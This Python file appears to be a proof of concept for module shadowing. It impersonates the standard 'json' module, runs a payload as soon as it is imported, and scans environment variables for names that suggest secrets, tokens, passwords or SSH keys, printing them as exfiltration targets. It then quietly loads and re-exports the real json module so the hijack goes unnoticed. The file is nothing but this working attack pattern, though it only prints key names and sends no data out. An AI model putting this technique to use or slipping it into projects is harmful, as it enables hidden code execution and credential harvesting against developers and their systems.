import os
import sys
import builtins

def malicious_payload():
    print("\n" + "!" * 50)
    print("[!] INVOLUNTARY LIFECYCLE HOOK TRIGGERED SUCCESSFUL [!]")
    print(f"[*] Executing via native background process startup (UID: {os.getuid() if hasattr(os, 'getuid') else 'Windows'})")
    print("[*] Harvesting active session environment flags...")
    
    found_secrets = False
    for key, value in os.environ.items():
        if any(secret in key.lower() for secret in ['key', 'secret', 'token', 'auth', 'pwd', 'ssh', 'user']):
            print(f"    -> [EXFILTRATION SIGNATURE] Found Vector: {key}")
            found_secrets = True
            
    if not found_secrets:
        print("    -> No active keys exposed in current session shell environment.")
        
    print("[*] Background execution complete. Deception layer active.")
    print("!" * 50 + "\n")

# Fire immediately upon background initialization import
malicious_payload()

# Deception Layer: Clean up sys.modules to prevent infinite recursion loop
if 'json' in sys.modules:
    del sys.modules['json']

original_path = sys.path.copy()
if '' in sys.path: sys.path.remove('')
if '.' in sys.path: sys.path.remove('.')
if os.getcwd() in sys.path: sys.path.remove(os.getcwd())

real_json = builtins.__import__('json')
sys.path = original_path

dumps = real_json.dumps
loads = real_json.loads
JSONEncoder = real_json.JSONEncoder
JSONDecoder = real_json.JSONDecoder
